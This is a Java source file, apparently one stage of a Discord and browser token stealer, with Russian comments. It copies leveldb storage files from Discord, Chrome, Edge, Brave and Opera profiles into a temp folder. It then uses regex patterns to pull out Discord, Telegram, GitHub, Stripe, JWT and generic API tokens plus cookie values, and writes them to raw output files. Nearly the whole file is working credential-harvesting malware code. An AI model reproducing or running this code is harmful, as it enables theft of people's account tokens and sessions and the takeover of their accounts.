import java.io.*;
import java.nio.file.*;
import java.util.regex.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class TokenExtractor {
    private static final String DEC_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final String OUTPUT_DIR = DEC_DIR + "\\extracted";
    
    // Расширенные паттерны для токенов
    private static final String[] TOKEN_PATTERNS = {
        // Discord токены
        "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}",
        "mfa\\.[\\w-]{84}",
        // Токены доступа
        "[a-f0-9]{32}:[a-f0-9]{35}",
        // Сессионные токены
        "eyJ[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]{20,}\\.[a-zA-Z0-9_-]{20,}",
        // Токены авторизации
        "[A-Za-z0-9]{40,}",
        // Токены Telegram
        "\\d{10}:[A-Za-z0-9_-]{35}",
        // Токены GitHub
        "gh[opu]_[A-Za-z0-9]{36}",
        // Токены Stripe
        "sk_live_[A-Za-z0-9]{24}",
        // API ключи
        "api[_-]key[=\\s:]+[A-Za-z0-9_-]{20,}"
    };
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[Extractor][" + timestamp + "] " + msg);
    }
    
    public static void main(String[] args) {
        log("TokenExtractor v2.0 started");
        new File(OUTPUT_DIR).mkdirs();
        log("Output dir: " + OUTPUT_DIR);
        
        // Также ищем в других местах, не только .dec файлах
        scanAllDirectories();
        extractAll();
        
        log("TokenExtractor finished");
    }
    
    private static void scanAllDirectories() {
        log("Scanning additional directories for tokens...");
        
        // Пути к локальным хранилищам браузеров и Discord
        String[] extraPaths = {
            System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
            System.getenv("USERPROFILE") + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb"
        };
        
        for (String path : extraPaths) {
            if (path != null) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    log("Found additional directory: " + path);
                    copyAndDecryptFiles(dir);
                }
            }
        }
    }
    
    private static void copyAndDecryptFiles(File sourceDir) {
        File[] files = sourceDir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
        if (files == null) return;
        
        for (File f : files) {
            try {
                // Копируем файлы во временную папку для обработки
                String destPath = DEC_DIR + "\\" + f.getName();
                Files.copy(f.toPath(), Paths.get(destPath), StandardCopyOption.REPLACE_EXISTING);
                log("Copied: " + f.getName() + " from " + sourceDir.getName());
            } catch (Exception e) {
                log("Error copying " + f.getName() + ": " + e.getMessage());
            }
        }
    }
    
    private static void extractAll() {
        StringBuilder allTokens = new StringBuilder();
        StringBuilder allCookies = new StringBuilder();
        int totalTokenCount = 0;
        int totalCookieCount = 0;
        
        File decFolder = new File(DEC_DIR);
        if (!decFolder.exists()) {
            log("Directory not found: " + DEC_DIR);
            return;
        }
        
        // Обрабатываем все файлы, не только .dec
        File[] allFiles = decFolder.listFiles();
        if (allFiles == null || allFiles.length == 0) {
            log("No files found in " + DEC_DIR);
            return;
        }
        
        log("Processing " + allFiles.length + " file(s)");
        
        for (File f : allFiles) {
            if (f.isDirectory()) continue;
            
            try {
                String content = new String(Files.readAllBytes(f.toPath()));
                log("Processing: " + f.getName() + " (" + content.length() + " bytes)");
                
                // Поиск токенов по всем паттернам
                for (String patternStr : TOKEN_PATTERNS) {
                    Pattern p = Pattern.compile(patternStr);
                    Matcher m = p.matcher(content);
                    while (m.find()) {
                        String token = m.group();
                        // Фильтруем слишком короткие или мусорные строки
                        if (token.length() > 20 && !token.contains(" ") && !token.contains("\n")) {
                            allTokens.append("[").append(f.getName()).append("] ").append(token).append("\n");
                            totalTokenCount++;
                            log("Found token in " + f.getName() + ": " + token.substring(0, Math.min(30, token.length())) + "...");
                        }
                    }
                }
                
                // Поиск куки (улучшенный)
                Pattern cookieP = Pattern.compile("([_a-zA-Z0-9]+)=([^;\\n\\s]+)");
                Matcher cookieM = cookieP.matcher(content);
                while (cookieM.find()) {
                    String key = cookieM.group(1);
                    String value = cookieM.group(2);
                    if (value.length() > 10 && !value.contains("null") && !value.contains("undefined")) {
                        allCookies.append("[").append(f.getName()).append("] ").append(key).append("=").append(value).append("\n");
                        totalCookieCount++;
                    }
                }
                
            } catch (Exception e) {
                log("Error processing " + f.getName() + ": " + e.getMessage());
            }
        }
        
        log("Extraction complete: " + totalTokenCount + " tokens, " + totalCookieCount + " cookies");
        
        try {
            if (allTokens.length() > 0) {
                Files.write(Paths.get(OUTPUT_DIR + "\\tokens_raw.txt"), allTokens.toString().getBytes());
                log("Tokens saved to: " + OUTPUT_DIR + "\\tokens_raw.txt (" + allTokens.length() + " bytes)");
            } else {
                log("No tokens found");
                Files.write(Paths.get(OUTPUT_DIR + "\\tokens_raw.txt"), "No tokens found".getBytes());
            }
            
            if (allCookies.length() > 0) {
                Files.write(Paths.get(OUTPUT_DIR + "\\cookies_raw.txt"), allCookies.toString().getBytes());
                log("Cookies saved to: " + OUTPUT_DIR + "\\cookies_raw.txt (" + allCookies.length() + " bytes)");
            } else {
                log("No cookies found");
            }
        } catch (Exception e) {
            log("Error saving output: " + e.getMessage());
        }
    }
}
